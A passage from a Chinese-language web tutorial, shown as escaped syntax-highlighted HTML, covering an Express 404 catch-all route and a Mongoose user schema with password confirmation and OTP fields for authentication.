&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;all&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/{*any}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`找不到此服务器上的&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;originalUrl&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;!`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;404&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;globalErrorHandler&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这确保所有错误都得到正确处理并将错误响应发送给用户。&lt;/p&gt;
&lt;h3 id=&#34;创建用户模型&#34;&gt;创建用户模型
&lt;/h3&gt;&lt;p&gt;要构建用户模型，在后端目录中创建一个新文件夹并命名为&amp;quot;model&amp;quot;。在model文件夹内，创建一个名为userModel.js的新文件。&lt;/p&gt;
&lt;p&gt;userModel.js文件主要为用户认证和安全而构建。它提供了使用Mongoose管理用户的验证丰富模式，映射用户数据在MongoDB数据库中的结构方式。它包括验证、密码哈希和安全比较用户密码的方法。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//userModel.js
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mongoose&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;mongoose&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;validator&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;validator&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;bcrypt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;bcryptjs&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;userSchema&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mongoose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;required&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;请提供用户名&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;minlength&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;maxlength&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;required&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;请提供电子邮件&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;unique&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;lowercase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;validate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;validator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isEmail&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;请提供有效电子邮件&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;required&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;请提供密码&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;minlength&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;passwordConfirm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;required&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;请确认您的密码&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;validate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;validator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;el&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;el&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;密码不匹配&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;isVerified&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Boolean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;otp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;otpExpires&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;resetPasswordOTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;resetPasswordOTPExpires&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;createdAt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;timestamps&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 保存前哈希密码
